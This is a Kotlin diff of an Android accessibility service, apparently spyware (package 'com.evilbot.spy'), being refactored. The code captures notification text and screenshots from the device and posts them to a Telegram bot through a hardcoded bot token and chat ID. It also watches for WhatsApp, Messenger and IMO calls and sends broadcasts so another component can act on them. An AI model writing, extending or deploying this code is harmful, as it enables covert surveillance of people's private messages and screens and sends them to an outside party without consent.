@@ -14,11 +14,14 @@ import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.File
 import java.io.FileOutputStream
+import java.util.concurrent.Executors
 
 class MyAccessibilityService : AccessibilityService() {
 
     companion object {
         var instance: MyAccessibilityService? = null
+        private val BOT_TOKEN = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
+        private val CHAT_ID = "8820979221"
     }
 
     override fun onServiceConnected() {
@@ -38,37 +41,34 @@ class MyAccessibilityService : AccessibilityService() {
             if (text.isNotBlank()) {
                 CoroutineScope(Dispatchers.IO).launch {
                     try {
-                        val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
-                        val chatId = "8820979221"
                         val ok = OkHttpClient()
                         val form = FormBody.Builder()
-                            .add("chat_id", chatId)
+                            .add("chat_id", CHAT_ID)
                             .add("text", "Notification: $text")
                             .build()
                         ok.newCall(
                             Request.Builder()
-                                .url("https://api.telegram.org/bot$token/sendMessage")
+                                .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                                 .post(form)
                                 .build()
                         ).execute()
-                    } catch (_: Exception) {}
+                    } catch (e: Exception) {
+                        Log.e("AccService", "Notify Error", e)
+                    }
                 }
             }
 
-            // 2. VoIP Call Detection (Notification ভিত্তিক)
+            // 2. VoIP Call Detection
             val packageName = event.packageName?.toString().orEmpty()
             val notifText = event.text?.joinToString(" ") ?: ""
-
-            // শুধুমাত্র নির্দিষ্ট VoIP অ্যাপ অথবা নোটিফিকেশনে "call" শব্দ থাকলে চেক করবে
             val voipApps = listOf("com.whatsapp", "com.imo.android.imoim", "com.facebook.orca", "com.facebook.mlite")
+
             if (packageName in voipApps || notifText.contains("call", ignoreCase = true)) {
                 if (notifText.contains(Regex("incoming|ongoing|active|call in progress|WhatsApp call|Messenger call|IMO call", RegexOption.IGNORE_CASE))) {
-                    // কল শুরু হলে ব্রডকাস্ট পাঠানো
-                    val intent = Intent("com.evilbot.spy.VOIP_CALL_START")
+                    val intent = Intent("com.evilbot.spy.VOIPCALLSTART")
                     sendBroadcast(intent)
                 } else if (notifText.contains(Regex("ended|missed|declined|call ended", RegexOption.IGNORE_CASE))) {
-                    // কল শেষ হলে ব্রডকাস্ট পাঠানো
-                    val intent = Intent("com.evilbot.spy.VOIP_CALL_END")
+                    val intent = Intent("com.evilbot.spy.VOIPCALLEND")
                     sendBroadcast(intent)
                 }
             }
@@ -78,22 +78,19 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onInterrupt() {}
 
     // Screenshot method – Android 9+ only
+    fun takeScreenshot(crop: Rect? = null) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
+            sendError("Screenshot not supported < P")
+            return
+        }
 
-fun takeScreenshot(crop: Rect? = null) {
-    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
-        sendError("Screenshot not supported < P")
-        return
-    }
-
-
-
-    val callback = object : TakeScreenshotCallback {
-        
+        val callback = object : TakeScreenshotCallback {
             override fun onSuccess(screenshotResult: ScreenshotResult) {
                 val bitmap = Bitmap.wrapHardwareBuffer(
                     screenshotResult.hardwareBuffer,
                     screenshotResult.colorSpace
                 ) ?: return
+
                 val finalBitmap = if (crop != null) {
                     Bitmap.createBitmap(bitmap, crop.left, crop.top, crop.width(), crop.height())
                 } else bitmap
@@ -103,19 +100,17 @@ fun takeScreenshot(crop: Rect? = null) {
                     FileOutputStream(file).use { fos ->
                         finalBitmap.compress(Bitmap.CompressFormat.PNG, 90, fos)
                     }
-                    // Telegram-এর মাধ্যমে পাঠানো
+                    // Upload to Telegram
                     try {
-                        val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
-                        val chatId = "8820979221"
                         val ok = OkHttpClient()
                         val body = MultipartBody.Builder()
                             .setType(MultipartBody.FORM)
-                            .addFormDataPart("chat_id", chatId)
+                            .addFormDataPart("chat_id", CHAT_ID)
                             .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
                             .build()
                         ok.newCall(
                             Request.Builder()
-                                .url("https://api.telegram.org/bot$token/sendPhoto")
+                                .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
                                 .post(body)
                                 .build()
                         ).execute()
@@ -124,41 +119,37 @@ fun takeScreenshot(crop: Rect? = null) {
                     }
                 }
             }
-            // যদি এই অংশটি কোনো ফাংশনের ভেতরে থাকে, যেমন:
-fun captureScreen() {
-    val callback = object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
-        override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
-            // স্ক্রিনশট সফল হলে যা করার তা এখানে লিখবেন
+
+            override fun onFailure(errorCode: Int) {
+                sendError("Screenshot failed with code $errorCode")
+            }
         }
 
-        override fun onFailure(errorCode: Int) {
-            sendError("Screenshot failed with code $errorCode")
-        }
+        // Corrected takeScreenshot call parameters
+        takeScreenshot(
+            0, // Display ID
+            Executors.newSingleThreadExecutor(),
+            callback
+        )
     }
-
-    // সঠিক প্যারামিটার দিয়ে takeScreenshot কল করা হলো
-    takeScreenshot(
-        0, // এখানে Looper এর পরিবর্তে Int টাইপের ডিসপ্লে আইডি (0) দেওয়া হয়েছে
-        java.util.concurrent.Executors.newSingleThreadExecutor(),
-        callback
-    )
-}
-
 
     private fun sendError(msg: String) {
         CoroutineScope(Dispatchers.IO).launch {
-            val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic" // আপনার টোকেন এখানে ব্যবহার করা হয়েছে
-            val chatId = "8820979221"
-            val ok = OkHttpClient()
-            val form = FormBody.Builder()
-                .add("chat_id", chatId)
-                .add("text", "Accessibility error: $msg")
-                .build()
-            ok.newCall(
-                Request.Builder()
-                    .url("https://api.telegram.org/bot$token/sendMessage")
-                    .post(form)
+            try {
+                val ok = OkHttpClient()
+                val form = FormBody.Builder()
+                    .add("chat_id", CHAT_ID)
+                    .add("text", "Accessibility error: $msg")
                     .build()
-            ).execute()
+                ok.newCall(
+                    Request.Builder()
+                        .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
+                        .post(form)
+                        .build()
+                ).execute()
+            } catch (e: Exception) {
+                Log.e("AccService", "SendError failed", e)
+            }
         }
     }
+}
